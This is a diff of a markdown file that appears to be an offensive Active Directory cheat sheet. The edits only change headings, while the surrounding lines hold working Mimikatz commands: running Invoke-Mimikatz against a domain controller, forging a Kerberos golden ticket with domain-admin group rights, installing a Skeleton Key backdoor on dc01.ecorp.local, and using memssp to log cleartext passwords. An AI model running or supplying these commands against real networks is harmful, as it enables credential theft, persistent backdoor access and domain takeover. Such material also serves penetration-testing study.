@@ -222,7 +222,7 @@ If functions not on remote host:-
 ```Copy-Item ./Invoke-Mimikatz.ps1 /Server1.local/c$/temp```
 ``` ls //Server1.local/c$/temp```
 
-#### Invoke Mimikatz
+# Invoke Mimikatz
 ```. ./Invoke-Mimikatz.ps1```
 
 ```Invoke-Mimikatz -ComputerName DC01```
@@ -242,8 +242,7 @@ Invoke-Mimikatz -Command '"kerberos::golden
 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
 ```
 
-#### Misc Attacks
-Skeleton Key Attack:-
+#### Skeleton Key Attack:-
 
 ```Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName dc01.ecorp.local```
 
@@ -256,7 +255,7 @@ privilege::debug
 misc::skeleton
 !-
 ```
- 
+ #### MemSSP
  MemSSP logs local logons, service account and machine account passwords in clear text on the target server:-
  
 ```Invoke-Mimikatz -Command '"misc::memssp"'``` - Logs local logons to C:\Windows\system32\kiwissp.log
